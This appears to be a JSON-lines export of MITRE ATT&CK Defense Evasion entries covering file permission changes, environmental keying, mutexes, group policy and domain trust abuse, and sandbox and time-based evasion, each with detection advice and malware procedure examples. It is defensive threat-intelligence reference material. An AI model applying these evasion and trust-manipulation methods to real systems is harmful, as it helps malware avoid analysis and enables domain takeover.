{"technique_id":"T1222.002","technique_name":"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode). Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.","detection":"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include chmod +x, chmod -R 755, and chmod 777. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.","procedures":["[G0139] TeamTNT: TeamTNT has modified the permissions on binaries with chattr.","[S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via chmod.","[S0598] P.A.S. Webshell: P.A.S. Webshell has the ability to modify file permissions.","[S0599] Kinsing: Kinsing has used chmod to modify permissions on key files for use.","[S0402] OSX/Shlayer: OSX/Shlayer can use the chmod utility to set a file as executable, such as chmod 777 or chmod +x.","[S1105] COATHANGER: COATHANGER will set the GID of `httpsd` to 90 when infected.","[S1070] Black Basta: The Black Basta binary can use `chmod` to gain full permissions to targeted files.","[S0281] Dok: Dok gives all users execute permissions for the application using the command chmod +x /Users/Shared/AppStore.app.","[C0035] KV Botnet Activity: KV Botnet Activity altered permissions on downloaded tools and payloads to enable execution on victim machines.","[S0658] XCSSET: XCSSET uses the chmod +x command to grant executable permissions to the malicious file.","[G0106] Rocke: Rocke has changed file permissions of files so they could not be modified.","[G0050] APT32: APT32's macOS backdoor changes the permission of the file it wants to execute to 755.","[S0587] Penquin: Penquin can add the executable flag to a downloaded file.","[S0482] Bundlore: Bundlore changes the permissions of a payload using the command chmod -R 755."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1480.001","technique_name":"Execution Guardrails: Environmental Keying","description":"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment. Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs). Similar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. Like other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","detection":"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","procedures":["[G0020] Equation: Equation has been observed utilizing environmental keying in payload delivery.","[G0096] APT41: APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.","[S0240] ROKRAT: ROKRAT relies on a specific victim hostname to execute and decrypt important strings.","[S1100] Ninja: Ninja can store its final payload in the Registry under `$HKLM\\SOFTWARE\\Classes\\Interface\\` encrypted with a dynamically generated key based on the drive’s serial number.","[S0260] InvisiMole: InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.","[S1145] Pikabot: Pikabot stops execution if the infected system language matches one of several languages, with various versions referencing: Georgian, Kazakh, Uzbek, Tajik, Russian, Ukrainian, Belarussian, and Slovenian.","[S0685] PowerPunch: PowerPunch can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.","[S0141] Winnti for Windows: The Winnti for Windows dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1480.002","technique_name":"Execution Guardrails: Mutual Exclusion","description":"Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time. While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes. By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised. In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself. Mutex names may be hard-coded or dynamically generated using a predictable algorithm.","detection":null,"procedures":["[S1161] BPFDoor: When executed, BPFDoor attempts to create and lock a runtime file, `/var/run/initd.lock`, and exits if it fails using the specified file, resulting in a makeshift mutex.","[S1202] LockBit 3.0: LockBit 3.0 can create and check for a mutex containing a hash of the `MachineGUID` value at execution to prevent running more than one instance.","[S0632] GrimAgent: GrimAgent uses the last 64 bytes of the binary to compute a mutex name. If the generated name is invalid, it will default to the generic `mymutex`.","[S0496] REvil: REvil attempts to create a mutex using a hard-coded value to ensure that no other instances of itself are running on the host.","[S0012] PoisonIvy: PoisonIvy creates a mutex using either a custom or default value.","[S1196] Troll Stealer: Troll Stealer creates a mutex during installation to prevent duplicate execution.","[S0562] SUNSPOT: SUNSPOT creates a mutex using the hard-coded value ` {12d61a41-4b74-7610-a4d8-3028d2f56395}` to ensure that only one instance of itself is running.","[S1183] StrelaStealer: StrelaStealer variants include the use of mutex values based on the victim system name to prevent reinfection.","[S0168] Gazer: Gazer creates a mutex using the hard-coded value `{531511FA-190D-5D85-8A4A-279F2F592CC7}` to ensure that only one instance of itself is running.","[G0082] APT38: APT38 has created a mutex to avoid duplicate execution.","[S1070] Black Basta: Black Basta will check for the presence of a hard-coded mutex `dsajdhas.0` before executing."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1484.001","technique_name":"Domain or Tenant Policy Modification: Group Policy Modification","description":"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\\\SYSVOL\\\\Policies\\`. Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution, and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse. For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.","detection":"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including: * Event ID 5136 - A directory service object was modified * Event ID 5137 - A directory service object was created * Event ID 5138 - A directory service object was undeleted * Event ID 5139 - A directory service object was moved * Event ID 5141 - A directory service object was deleted GPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).","procedures":["[S1058] Prestige: Prestige has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.","[S1202] LockBit 3.0: LockBit 3.0 can enable options for propogation through Group Policy Objects.","[S0697] HermeticWiper: HermeticWiper has the ability to deploy through an infected system's default domain policy.","[G1021] Cinnamon Tempest: Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment.","[S0363] Empire: Empire can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job.","[G0096] APT41: APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.","[S1199] LockBit 2.0: LockBit 2.0 can modify Group Policy to disable Windows Defender and to automatically infect devices in Windows domains.","[G0119] Indrik Spider: Indrik Spider has used Group Policy Objects to deploy batch scripts.","[S0554] Egregor: Egregor can modify the GPO to evade detection.","[S0688] Meteor: Meteor can use group policy to push a scheduled task from the AD to all network machines.","[C0034] 2022 Ukraine Electric Power Attack: During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1484.002","technique_name":"Domain or Tenant Policy Modification: Trust Modification","description":"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains. Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.","detection":"Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes Set federation settings on domain and Set domain authentication. This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. Monitor for PowerShell commands such as: Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\", or Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\" –supportmultipledomain.","procedures":["[G1015] Scattered Spider: Scattered Spider adds a federated identity provider to the victim’s SSO tenant and activates automatic account linking.","[S0677] AADInternals: AADInternals can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. AADInternals can also modify DesktopSSO information.","[C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1497.001","technique_name":"Virtualization/Sandbox Evasion: System Checks","description":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.","detection":"Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","procedures":["[S0650] QakBot: QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.","[S0354] Denis: Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.","[S0627] SodaMaster: SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\\\Applications\\\\VMwareHostOpen.exe before proceeding to its main functionality.","[S0439] Okrum: Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.","[S0260] InvisiMole: InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.","[G0120] Evilnum: Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.","[S0024] Dyre: Dyre can detect sandbox analysis environments by inspecting the process list and Registry.","[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.","[S0438] Attor: Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.","[S1039] Bumblebee: Bumblebee has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.","[S0182] FinFisher: FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.","[S0373] Astaroth: Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.","[S0242] SynAck: SynAck checks its directory location in an attempt to avoid launching in a sandbox.","[S0576] MegaCortex: MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator.","[S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as `sysctl hw.model` and the kernel boot time.","[S1048] macOS.OSAMiner: macOS.OSAMiner can parse the output of the native `system_profiler` tool to determine if the machine is running with 4 cores.","[S0226] Smoke Loader: Smoke Loader scans processes to perform anti-VM checks.","[S0561] GuLoader: GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent.","[S0396] EvilBunny: EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.","[S0248] yty: yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware.","[S0532] Lucifer: Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.","[G1017] Volt Typhoon: Volt Typhoon has run system checks to determine if they were operating in a virtualized environment.","[S0237] GravityRAT: GravityRAT uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment.","[S1213] Lumma Stealer: Lumma Stealer has queried system resources on the victim device to identify if it is executing in a sandbox or virtualized environments, checking usernames, conducting WMI queries for system details, checking for files commonly found in virtualized environments, searching system services, and inspecting process names. Lumma Stealer has checked system GPU configurations for sandbox detection.","[S0337] BadPatch: BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information.","[S0428] PoetRAT: PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting.","[S0612] WastedLocker: WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.","[S0264] OopsIE: OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if it’s running in a virtual environment.","[S1066] DarkTortilla: DarkTortilla can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie.","[S0333] UBoatRAT: UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.","[S0689] WhisperGate: WhisperGate can stop its execution when it recognizes the presence of certain monitoring tools.","[S1087] AsyncRAT: AsyncRAT can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.","[S1018] Saint Bot: Saint Bot has run several virtual machine and sandbox checks, including checking if `Sbiedll.dll` is present in a list of loaded modules, comparing the machine name to `HAL9TH` and the user name to `JohnDoe`, and checking the BIOS version for known virtual machine identifiers.","[G0012] Darkhotel: Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.","[S0013] PlugX: PlugX checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\".","[S1019] Shark: Shark can stop execution if the screen width of the targeted machine is not over 600 pixels.","[S0192] Pupy: Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine.","[S0626] P8RAT: P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments.","[S0531] Grandoreiro: Grandoreiro can detect VMWare via its I/O port and Virtual PC via the vpcext instruction.","[S0240] ROKRAT: ROKRAT can check for VMware-related files and DLLs related to sandboxes.","[S0332] Remcos: Remcos searches for Sandboxie and VMware on the system.","[S1147] Nightdoor: Nightdoor embeds code from the public `al-khaser` project, a repository that works to detect virtual machines, sandboxes, and malware analysis environments.","[S1070] Black Basta: Black Basta can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing.","[C0001] Frankenstein: During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.","[S0270] RogueRobin: RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment.","[S0644] ObliqueRAT: ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools.","[S0637] NativeZone: NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.","[S0094] Trojan.Karagany: Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.","[S0657] BLUELIGHT: BLUELIGHT can check to see if the infected machine has VM tools running.","[S1122] Mispadu: Mispadu can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is “JOHN-PC.”","[S1207] XLoader: XLoader performs timing checks using the Read-Time Stamp Counter (RDTSC) instruction on the victim CPU.","[S1064] SVCReady: SVCReady has the ability to determine if its runtime environment is virtualized.","[S0679] Ferocious: Ferocious can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.","[S0559] SUNBURST: SUNBURST checked the domain name of the compromised host to verify it was running in a real environment.","[S1086] Snip3: Snip3 has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying `Win32_ComputerSystem` to extract the `Manufacturer` string.","[S1130] Raspberry Robin: Raspberry Robin performs a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment, such as querying CPU temperature information and network card MAC address information.","[S0588] GoldMax: GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a.","[S1160] Latrodectus: Latrodectus can determine if it is running in a virtualized environment by checking the OS version, checking the number of running processes, ensuring a 64-bit application is running on a 64-bit host, and checking if the host has a valid MAC address.","[S0527] CSPY Downloader: CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.","[S1111] DarkGate: DarkGate queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.","[G0049] OilRig: OilRig has used macros to verify if a mouse is connected to a compromised machine.","[S1179] Exbyte: Exbyte performs various checks to determine if it is running in a sandboxed environment to prevent analysis.","[S1145] Pikabot: Pikabot performs a variety of system checks to determine if it is running in an analysis environment or sandbox, such as checking the number of processors (must be greater than two), and the amount of RAM (must be greater than 2GB).","[S1180] BlackByte Ransomware: BlackByte Ransomware checks for files related to known sandboxes.","[S1159] DUSTTRAP: DUSTTRAP decryption relies on the infected machine's `HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID` value."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1497.002","technique_name":"Virtualization/Sandbox Evasion: User Activity Based Checks","description":"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate.","detection":"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","procedures":["[G0012] Darkhotel: Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.","[S0439] Okrum: Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments.","[G0046] FIN7: FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.","[S0543] Spark: Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1497.003","technique_name":"Virtualization/Sandbox Evasion: Time Based Evasion","description":"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny. Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data). Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.","detection":"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","procedures":["[S0565] Raindrop: After initial installation, Raindrop runs a computation to delay execution.","[S0626] P8RAT: P8RAT has the ability to \"sleep\" for a specified time to evade detection.","[S0559] SUNBURST: SUNBURST remained dormant after initial access for a period of up to two weeks.","[S0574] BendyBear: BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.","[S0554] Egregor: Egregor can perform a long sleep (greater than or equal to 3 minutes) to evade detection.","[S0611] Clop: Clop has used the sleep command to avoid sandbox detection.","[S0627] SodaMaster: SodaMaster has the ability to put itself to \"sleep\" for a specified time.","[S0660] Clambling: Clambling can wait 30 minutes before initiating contact with C2.","[S0386] Ursnif: Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools.","[S0439] Okrum: Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.","[S0512] FatDuke: FatDuke can turn itself on or off at random intervals.","[S1066] DarkTortilla: DarkTortilla can implement the `kernel32.dll` Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.","[S1141] LunarWeb: LunarWeb can pause for a number of hours before entering its C2 communication loop.","[S1039] Bumblebee: Bumblebee has the ability to set a hardcoded and randomized sleep interval.","[S0115] Crimson: Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload.","[S1138] Gootloader: Gootloader can designate a sleep period of more than 22 seconds between stages of infection.","[S1018] Saint Bot: Saint Bot has used the command `timeout 20` to pause the execution of its initial loader.","[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used tools that collected `GetTickCount` and `GetSystemTimeAsFileTime` data to detect sandbox or VMware services.","[S0671] Tomiris: Tomiris has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.","[S0697] HermeticWiper: HermeticWiper has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.","[S0447] Lokibot: Lokibot has performed a time-based anti-debug check before downloading its third stage.","[S1086] Snip3: Snip3 can execute `WScript.Sleep` to delay execution of its second stage.","[S1212] RansomHub: RansomHub can sleep for a set number of minutes before beginning execution.","[S0268] Bisonal: Bisonal has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.","[S1034] StrifeWater: StrifeWater can modify its sleep time responses from the default of 20-22 seconds.","[S0453] Pony: Pony has delayed execution using a built-in function to avoid detection and analysis.","[S1132] IPsec Helper: IPsec Helper will sleep for a random number of seconds, iterating 200 times over sleeps between one to three seconds, before continuing execution flow.","[S0266] TrickBot: TrickBot has used printf and file I/O loops to delay process execution as part of API hammering.","[S1059] metaMain: metaMain has delayed execution for five to six minutes during its persistence establishment process.","[S0650] QakBot: The QakBot dropper can delay dropping the payload to evade detection.","[S0513] LiteDuke: LiteDuke can wait 30 seconds before executing additional code if security software is detected.","[S0632] GrimAgent: GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task.","[S0534] Bazar: Bazar can use a timer to delay execution of core functionality.","[S0396] EvilBunny: EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.","[S0642] BADFLICK: BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes.","[S0493] GoldenSpy: GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system.","[S0689] WhisperGate: WhisperGate can pause for 20 seconds to bypass antivirus solutions.","[S0694] DRATzarus: DRATzarus can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to measure function timing. DRATzarus can also remotely shut down into sleep mode under specific conditions to evade detection.","[S0588] GoldMax: GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.","[S0561] GuLoader: GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID.","[S1064] SVCReady: SVCReady can enter a sleep stage for 30 minutes to evade detection.","[S1063] Brute Ratel C4: Brute Ratel C4 can call `NtDelayExecution` to pause execution.","[S0658] XCSSET: Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, .report. After the elapsed time, XCSSET executes additional modules.","[S0595] ThiefQuest: ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox.","[S0584] AppleJeus: AppleJeus has waited a specified time before downloading a second stage payload."],"tactics":"TA0005 - Defense Evasion"}
